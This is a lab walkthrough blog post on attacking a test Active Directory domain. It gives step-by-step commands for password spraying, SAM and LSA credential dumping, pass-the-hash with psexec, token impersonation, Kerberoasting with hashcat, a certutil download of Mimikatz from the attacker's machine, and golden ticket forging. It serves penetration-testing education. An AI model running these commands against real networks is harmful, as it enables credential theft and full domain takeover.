---
layout: post
title: AD Attack Lab Part Four (Pass The Hash, Token Impersonation, Kerberoasting, Mimikatz, and Golden Ticket attacks)
---

![Alt](https://bohansec.com//assets/AD-Attack-4/pexels-pixabay-60504.jpg "Pixabay")

In this post, we will explore the Pass-The-Hash attack, Token Impersonation attack, Kerberoasting attack, Mimikatz attack, and Golden ticket attack in an AD environment. If you haven’t set up the lab yet, follow [Part One](https://bohansec.com/2020/10/10/How-To-Set-Up-AD-Attack-Lab-Part-1/){:target="_blank"} and [Part Two](https://bohansec.com/2020/10/18/AD-Attack-Lab-Part-2/){:target="_blank"} to get your lab setup. 

# Pass The Hash Attack

The Pass-The-Hash attack essentially is an attack that allows an attacker who has gained a foothold in a network to pass the dumped NTLM hash around. This usually involves an attacker dumped the victim machines NTLM hash and a perform password spraying attack. Let us see how we can perform this attack in our lab environment. 

I will use “CrackMapExec” and “psexec.py” from Impacket for the purpose of this lab. If you have not installed Impacket, head over to [Part Two](https://bohansec.com/2020/10/18/AD-Attack-Lab-Part-2/){:target="_blank"} and get the Impacket installed on your Kali machine. 

### Install CrackMapExec

{% highlight js %}
sudo python3 -m pip install pipx
sudo pipx ensurepath
sudo apt-get install python3-venv
sudo pipx install crackmapexec
sudo pipx ensurepath
sudo su
crackmapexec
{% endhighlight %}

![PTH](https://bohansec.com//assets/AD-Attack-4/1.PNG "PTH")
![PTH](https://bohansec.com//assets/AD-Attack-4/2.PNG "PTH")
![PTH](https://bohansec.com//assets/AD-Attack-4/3.PNG "PTH")
![PTH](https://bohansec.com//assets/AD-Attack-4/4.PNG "PTH")

### Pass The Password/Hashes With CrackMapExec

The CrackMapExec allows us to pass the plain-text password to the network to perform a password spraying. We will use the plain-text password for the user “Beauden Wallis” we created early to against the whole network range. The situation here is we assume the credential of the domain user “Beauden Wallis” has been compromised, the attacker is trying to use the credential to see what other workstation or username can be logged in with this set of the password. 

{% highlight js %}
crackmapexec smb 192.168.200.0/24 -u bwallis -d KUDOS.local -p P@ssWord!
{% endhighlight %}

![PTH](https://bohansec.com//assets/AD-Attack-4/5.PNG "PTH")

The “Green Plus” shows with the credential we supplied, the two workstations, and the domain controller all can be accessed. Let’s dump the SAM database and get the hash we need. 

{% highlight js %}
crackmapexec smb 192.168.200.0/24 -u bwallis -d KUDOS.local -p P@ssWord! --sam
{% endhighlight %}

![PTH](https://bohansec.com//assets/AD-Attack-4/6.PNG "PTH")

We can use “psexec.py” to get a SYSTEM shell with the credential we had for domain user “Beauden Wallis”.

{% highlight js %}
psexec.py kudos.local/bwallis:P@ssWord\!@192.168.200.158
{% endhighlight %}

![PTH](https://bohansec.com//assets/AD-Attack-4/7.PNG "PTH")

The “secretsdump.py” from Impacket can also be used for dumping the SAM database. 

{% highlight js %}
secretsdump.py kudos.local/bwallis:P@ssWord\!@192.168.200.156
secretsdump.py kudos.local/bwallis:P@ssWord\!@192.168.200.158
{% endhighlight %}

![PTH](https://bohansec.com//assets/AD-Attack-4/8.PNG "PTH")
![PTH](https://bohansec.com//assets/AD-Attack-4/9.PNG "PTH")

Save the User account hashes into a text file.

![PTH](https://bohansec.com//assets/AD-Attack-4/10.PNG "PTH")

Let us see if we can crack the three hashes we obtained with Hashcat.

{% highlight js %}
hashcat -m 1000 hash-crack rockyou.txt --force
{% endhighlight %}

![PTH](https://bohansec.com//assets/AD-Attack-4/11.PNG "PTH")

We see only one hash was being cracked with wordlist “rockyou.txt”, which is the administrator account’s password. Now, let’s see if we can use the Pass-The-Hash technique on the network to gain access. 

{% highlight js %}
crackmapexec smb 192.168.200.0/24 -u calcock -H 924572879ba3b163cc44e0abc5af208a --local-auth
crackmapexec smb 192.168.200.0/24 -u bwallis -H cbe6872995bc342778fc13ce339770ea --local-auth
{% endhighlight %}

![PTH](https://bohansec.com//assets/AD-Attack-4/13.PNG "PTH")

{% highlight js %}
psexec.py bwallis:@192.168.200.158 -hashes aad3b435b51404eeaad3b435b51404ee:cbe6872995bc342778fc13ce339770ea
{% endhighlight %}

We can see “DESKTOP-USER1” is logged in with local user “bwallis” and “DESKTOP-USER2” with user “calcock”. Now, let’s use “psexec.py” to pop a SYSTEM shell. 

![PTH](https://bohansec.com//assets/AD-Attack-4/14.PNG "PTH")

# Token Impersonation Attack

Token impersonation essentially allows an attacker to impersonate another logged-in user on the current session until the next reboot, which means if a domain administrator user is logged-in to a workstation where the attacker has a foothold, the attacker can impersonate the domain administrator and take over the whole network. 

Use “windows/smb/psexec” in Metasploit to get a Meterpreter shell on one of the Windows 10 machines. 

![TIA](https://bohansec.com//assets/AD-Attack-4/15.PNG "TIA")
![TIA](https://bohansec.com//assets/AD-Attack-4/16.PNG "TIA")

Load the “incognito” module into the current Meterpreter session. 

{% highlight js %}
load incognito
{% endhighlight %}

![TIA](https://bohansec.com//assets/AD-Attack-4/17.PNG "TIA")

List currently available token for the logged-in accounts.

{% highlight js %}
list_tokens -u
{% endhighlight %}

![TIA](https://bohansec.com//assets/AD-Attack-4/18.PNG "TIA")

We can impersonate account “bwallis” since it was logged-in. 

{% highlight js %}
impersonate_token KUDOS\\bwallis
{% endhighlight %}

![TIA](https://bohansec.com//assets/AD-Attack-4/19.PNG "TIA")

We can also back to the previous Meterpreter session with “rev2self”. We see we do not have the proper access to dump the SAM database in the impersonated account. 

![TIA](https://bohansec.com//assets/AD-Attack-4/20.PNG "TIA")

Loggin as the domain administrator, a new administrator token is available for us to impersonate. 

![TIA](https://bohansec.com//assets/AD-Attack-4/21.PNG "TIA")
![TIA](https://bohansec.com//assets/AD-Attack-4/22.PNG "TIA")
![TIA](https://bohansec.com//assets/AD-Attack-4/23.PNG "TIA")

# Kerberoasting Attack

Kerberoasting Attack allows an attacker to forge or steal a TGS and potentially crack the encryption password offline. 

Request a TGS for the SQL service account we set up early. The “GetUserSPNs.py” is from Impacket toolkit. 

{% highlight js %}
GetUserSPNs.py kudos.local/bwallis:P@ssWord\! -dc-ip 192.168.200.153 -request
{% endhighlight %}

![Kerberoasting](https://bohansec.com//assets/AD-Attack-4/24.PNG "Kerberoasting")

Identify the mode we are going to use to crack the TGS. 

{% highlight js %}
hashcat --help | grep Kerb
{% endhighlight %}

![Kerberoasting](https://bohansec.com//assets/AD-Attack-4/25.PNG "Kerberoasting")

I have made a wordlist for the purpose of this lab. 

![Kerberoasting](https://bohansec.com//assets/AD-Attack-4/28.PNG "Kerberoasting")

Crack the TGS:

{% highlight js %}
hashcat -m 13100 kerb-hash wordlists --force
{% endhighlight %}

![Kerberoasting](https://bohansec.com//assets/AD-Attack-4/27.PNG "Kerberoasting")

# Mimikatz and Golden Ticket Attack

[Mimikatz](https://github.com/gentilkiwi/mimikatz){:target="_blank"} can perform a wide variety of attacks related to Windows credentials and Kerberos tickets. 

Download the Mimikatz to kali then transfer to the Domain Controller. 

{% highlight js %}
sudo python -m SimpleHTTPServer 80
certutil.exe -urlcache -f http://192.168.200.160/mimikatz_trunk.zip mimikatz_trunk.zip
{% endhighlight %}

![Mimikatz](https://bohansec.com//assets/AD-Attack-4/29.PNG "Mimikatz")
![Mimikatz](https://bohansec.com//assets/AD-Attack-4/30.PNG "Mimikatz")
![Mimikatz](https://bohansec.com//assets/AD-Attack-4/31.PNG "Mimikatz")

Check if we have administrator privilege to run the Mimikatz. 

![Mimikatz](https://bohansec.com//assets/AD-Attack-4/32.PNG "Mimikatz")

Dumping the logon users’ password. 

{% highlight js %}
sekurlsa::logonpasswords
{% endhighlight %}

![Mimikatz](https://bohansec.com//assets/AD-Attack-4/33.PNG "Mimikatz")

Try to dump the SAM database. We see it doesn’t work since we are not under SYSTEM privilege. In this case, we can use psexec to get a SYSTEM shell and dump the SAM database from there. 

{% highlight js %}
lsadump::sam
lsadump::sam /patch
{% endhighlight %}

![Mimikatz](https://bohansec.com//assets/AD-Attack-4/34.PNG "Mimikatz")
![Mimikatz](https://bohansec.com//assets/AD-Attack-4/35.PNG "Mimikatz")

Dumping the SAM with the "lsadump::lsa /patch".

{% highlight js %}
lsadump::lsa /patch
{% endhighlight %}

![Mimikatz](https://bohansec.com//assets/AD-Attack-4/36.PNG "Mimikatz")

We can also use the Mimikatz to perform the golden ticket attack with “krbtgt” account, essentially it will give us a command prompt that allows us to access any computers in the domain. 

Obtain the credentials for “krbtgt” account:

{% highlight js %}
lsadump::lsa /inject /name:krbtgt
{% endhighlight %}

![Mimikatz](https://bohansec.com//assets/AD-Attack-4/37.PNG "Mimikatz")

Generate our golden ticket for the current session, note the hashes and SID we obtained when dumping the “krbtgt” account. 

{% highlight js %}
kerberos::golden /User:Administrator /domain:kudos.local /sid:S-1-5-21-1510980245-1658837649-3915912440 /krbtgt:91829003942208c879f83073fb387c5f /id:500 /ptt
{% endhighlight %}

![Mimikatz](https://bohansec.com//assets/AD-Attack-4/37.PNG "Mimikatz")

Open a command prompt contains this TGT, which allows us to access any computers in the domain.

{% highlight js %}
misc::cmd
dir \\DESKTOP-USER2\c$
{% endhighlight %}

![Mimikatz](https://bohansec.com//assets/AD-Attack-4/38.PNG "Mimikatz")
![Mimikatz](https://bohansec.com//assets/AD-Attack-4/39.PNG "Mimikatz")

We examined several interesting attacks against the misconfigured AD environment. In future posts, I will discuss how we can detect these attacks. Thanks for reading :)